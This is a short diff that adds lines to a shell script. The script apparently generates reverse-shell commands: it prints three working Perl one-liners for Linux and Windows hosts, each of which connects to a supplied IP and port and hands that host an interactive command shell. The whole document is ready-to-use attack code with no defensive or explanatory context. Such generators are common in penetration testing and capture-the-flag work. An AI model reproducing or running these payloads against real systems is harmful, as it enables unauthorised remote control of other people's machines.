@@ -1,0 +1,6 @@
+echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
+echo -e  "\t\033[1mperl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\033[m"
+echo -e "\033[31m\033[1mFor Linux hosts without /bin/sh:\033[m"
+echo -e "\t\033[1mperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
+echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
+echo -e "\t\033[1mperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
